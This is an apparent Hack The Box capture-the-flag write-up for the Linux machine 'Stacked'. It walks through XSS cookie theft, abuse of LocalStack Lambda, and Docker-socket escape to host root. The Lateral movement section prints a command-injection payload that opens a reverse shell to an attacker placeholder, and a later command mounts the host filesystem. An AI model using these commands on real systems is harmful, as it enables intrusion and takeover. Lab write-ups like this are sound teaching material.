---
machine: Stacked
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, cloud, localstack, aws, xss, docker, privesc]
---

# Stacked — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A portfolio vhost has XSS and the administrator mailbox reveals LocalStack credentials. The simulated AWS API allows creating a Lambda that runs commands in the LocalStack container. Command injection in LocalStack gives root in that container, and the mounted Docker socket allows host filesystem access and root.

## Recon

```bash
nmap -Pn -sCV -p80,4566 <IP>
```

- `80` nginx and `4566` the LocalStack API.
- `ffuf` with `Host: FUZZ.stacked.htb` finds `portfolio.stacked.htb` and `localstack.stacked.htb`.
- The portfolio allows sending a message to the administrator.

## Enumeration

- The message is rendered unescaped and the administrator reviews it with a browser.
- XSS steals the session cookie and opens the mailbox.
- The mailbox contains LocalStack credentials and the API URL.

## Foothold

With the credentials, enumerate LocalStack (`awslocal`) and create a Lambda with a ZIP that starts a reverse shell; invoking it runs in the LocalStack container.

```bash
awslocal lambda create-function --function-name pwn --runtime python3.9 --handler lambda_function.handler --zip-file fileb://payload.zip --role arn:aws:iam::000000000000:role/lambda-role
awslocal lambda invoke --function-name pwn out.json
```

## Lateral movement

The Lambda handler name is concatenated unescaped into LocalStack's `docker create` command. A `;` in `--handler` runs commands as root inside the LocalStack container.

```bash
aws --endpoint-url http://localstack.stacked.htb:4566 lambda create-function --function-name pwn --runtime nodejs12.x --handler 'index.handler;bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"' --zip-file fileb://payload.zip --role arn:aws:iam::000000000000:role/lambda-role
```

## Privilege escalation

As root inside LocalStack, `/var/run/docker.sock` is accessible. Start a container with the host `/` mounted at `/mnt` and write an SSH key to `/mnt/root/.ssh/authorized_keys`.

```bash
docker -H unix:///var/run/docker.sock run --rm -it -u root -v /:/mnt lambci/lambda:nodejs12.x bash
```

## Evidence

- XSS in the portfolio and administrator mailbox.
- LocalStack credentials and malicious Lambda.
- Command injection and root in LocalStack.
- Docker socket and host root.

## Lessons learned

- A simulated cloud environment may hold real host credentials.
- A Lambda is code execution when the API is controlled.
- Mounting `docker.sock` is equivalent to host root.

## Mitigation and detection

- Do not use real credentials in LocalStack or expose it.
- Isolate Lambda and restrict the init API.
- Do not mount the Docker socket into reachable containers.

## References

- [0xdf — Stacked](https://0xdf.gitlab.io/2022/03/19/htb-stacked.html)
- [IppSec — Stacked](https://www.youtube.com/watch?v=aWXfEDIYZu8)
- [Hack The Box — Stacked](https://app.hackthebox.com/machines/stacked)
